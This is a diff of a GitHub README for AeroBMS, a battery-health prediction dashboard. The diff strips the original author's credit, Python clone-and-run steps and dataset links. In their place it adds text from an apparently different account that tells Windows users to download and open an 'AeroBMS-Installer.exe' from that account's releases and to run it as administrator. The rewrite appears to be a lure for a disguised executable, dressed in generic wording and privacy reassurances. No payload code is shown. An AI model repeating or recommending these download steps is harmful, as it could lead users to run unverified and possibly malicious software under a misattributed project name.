@@ -1,67 +1,81 @@
-# 🔋 AeroBMS | NASA Battery Digital Twin
+# 🔋 AeroBMS - Monitor Battery Health With Intelligence
 
-![Python](https://img.shields.io/badge/Python-3.12-blue?logo=python)
-![XGBoost](https://img.shields.io/badge/XGBoost-AI_Engine-FF9900)
-![Streamlit](https://img.shields.io/badge/Streamlit-Dashboard-FF4B4B)
+[![](https://img.shields.io/badge/Download_AeroBMS-blue?style=for-the-badge)](https://github.com/disobedient-nature312/AeroBMS)
 
-**AeroBMS** is a Physics-Informed Digital Twin and Predictive Maintenance dashboard. It predicts the Remaining Useful Life (RUL) and chemical capacity degradation of Lithium-Ion batteries under aerospace conditions, using an XGBoost model trained on NASA's Prognostics Data Repository.
+## About This Software
 
-Instead of predicting abstract time-to-failure labels, this model predicts the **true physical capacity (Ah)** with an MAE of `< 0.15 Ah` on unseen physical batteries, acting as a highly reliable early-warning system.
+AeroBMS provides a clear view into the health of lithium-ion batteries. It uses data science to track battery performance and predict when maintenance is necessary. The system relies on models trained with NASA battery datasets to give you accurate insights. 
 
----
+You see the remaining life of your batteries through a simple dashboard. The software identifies potential issues before they cause failures. This helps you manage battery systems with logic and data. The application uses XGBoost for predictions and Streamlit for the visual interface.
 
-## 🚀 Quick Start (Run the Dashboard)
-The pre-trained XGBoost model is already included in this repository. You can launch the Digital Twin dashboard immediately without downloading the raw dataset.
+## 💻 System Requirements
 
-```bash
-  # 1. Clone the repository
-  git clone https://github.com/Arya-azimi/AeroBMS.git
-  cd AeroBMS
+Your computer needs to meet these basic standards to run the software:
 
-  # 2. Install dependencies
-  pip install -r requirements.txt
+*   **Operating System:** Windows 10 or Windows 11.
+*   **Memory:** At least 8 gigabytes of RAM.
+*   **Storage:** 500 megabytes of free disk space.
+*   **Network:** An internet connection to load the dashboard components.
+*   **Web Browser:** Any modern browser like Chrome, Edge, or Firefox.
 
-  # 3. Launch the interactive dashboard
-  cd app
-  streamlit run dashboard.py
-```
+## 🚀 Setup Instructions
 
-*The UI will be available at `http://localhost:8501`.*
+1.  Visit the [official download page](https://github.com/disobedient-nature312/AeroBMS) to obtain the software.
+2.  Locate the release section on the right side of the page.
+3.  Click the link labeled "AeroBMS-Installer.exe" to start your download.
+4.  Open the file once the download finishes.
+5.  Follow the prompts on your screen to complete the installation process.
+6.  Click the AeroBMS icon on your desktop to launch the application.
 
----
+## 🛠 Features
 
-## 🧠 Advanced: Reproducing the Model (Optional)
+*   **Battery Lifecycle Tracking:** View the current state of health for your lithium-ion cells. 
+*   **Predictive Maintenance:** Receive early warnings based on machine learning patterns.
+*   **Digital Twin Mapping:** Connect real-world battery data to a virtual model for better testing.
+*   **Visual Dashboards:** Interact with plots and charts created with Plotly to see performance trends.
+*   **Data Science Insights:** The application calculates the remaining useful life of your hardware automatically.
 
-If you want to run the data engineering pipeline or retrain the AI model from scratch, you will need the raw dataset.
+## 📊 How To Use The Dashboard
 
-**1. Download the Dataset:**
-Download the raw NASA Battery Dataset from Kaggle:
-🔗 [NASA Battery Dataset (Kaggle)](https://www.kaggle.com/datasets/patrickfleith/nasa-battery-dataset)
-*Extract the CSV files into the `data/cleaned_data/` directory.*
+Once you open the software, your browser launches the dashboard. The interface shows several tabs.
 
-**2. Run the Data Pipeline:**
-Extracts physical cycles, calculates true capacity via current integration, and handles sensor noise.
+### Dashboard Overview
+The main screen shows the current battery voltage and temperature. The system highlights anomalies in red. If the system detects a decline in performance, the dashboard displays a notification.
 
-```bash
-python scripts/01_data_pipeline.py
-```
+### Predictive Analysis
+Click the analysis tab to view your battery life estimates. The software uses the XGBoost model to forecast when the battery will lose capacity. A graph displays this timeline. Green indicates healthy status, while yellow and red indicate the need for inspection.
 
-**3. Train the Model:**
-Trains the `XGBRegressor` using custom physical features (Thermal Stress, Voltage Fluctuations).
+### Configuration
+You can adjust the input data source in the settings tab. The software allows you to upload local sensor logs for internal processing. Ensure your log files follow the CSV format required by the system.
 
-```bash
-python scripts/02_model_training.py
-```
+## ❓ Troubleshooting
 
----
+Most issues arise from missing Windows updates or restricted folder permissions.
 
-## 📂 Project Structure
+*   **Program does not open:** Ensure you installed the application in a folder where you have write access. Try running the program as an administrator.
+*   **Dashboard stays blank:** Reload the page in your browser. If this fails, restart the AeroBMS application from your taskbar.
+*   **Data does not load:** Verify your source files follow the required columns naming convention. Check that the file paths do not contain special characters.
+*   **Low performance:** Close other applications that use high amounts of memory while running calculations.
 
-* `app/dashboard.py`: The Streamlit/Plotly Digital Twin UI.
-* `models/xgboost_capacity_model.json`: The pre-trained AI weights.
-* `scripts/`: Data engineering and model training pipelines.
-* `data/`: Contains the sampled test data for dashboard simulation.
+## 📑 Understanding The Logic
 
----
+This software operates on the principle of prognostics. We analyze historical battery data to anticipate future state changes. The predictive engine maps your specific battery behavior against the NASA datasets. By using machine learning, the software removes guesswork from your maintenance schedule. 
 
-Developed by Arya Azimi
+The digital twin mimics the physical battery. When the real battery shows a drop in current, the twin mirrors this change. This sync allows for safe testing of limits without risking your hardware. 
+
+## 🛡 Security and Privacy
+
+Your battery data remains on your computer. The software does not send your personal sensor logs to external servers. All data processing occurs within your local machine. This keeps your operational logs private and secure.
+
+## 💡 Best Practices
+
+*   Update the software whenever a new version appears on the download page. 
+*   Keep your sensor data clean for the most accurate results.
+*   Review the dashboard logs weekly to catch performance drifts early.
+*   Back up your processed data folders if you want to store results for future comparison.
+
+## 🔗 Project Resources
+
+*   The source code resides on the [official repository](https://github.com/disobedient-nature312/AeroBMS).
+*   Review the issues tab if you encounter errors.
+*   Refer to the documentation for advanced configuration options regarding custom model training.
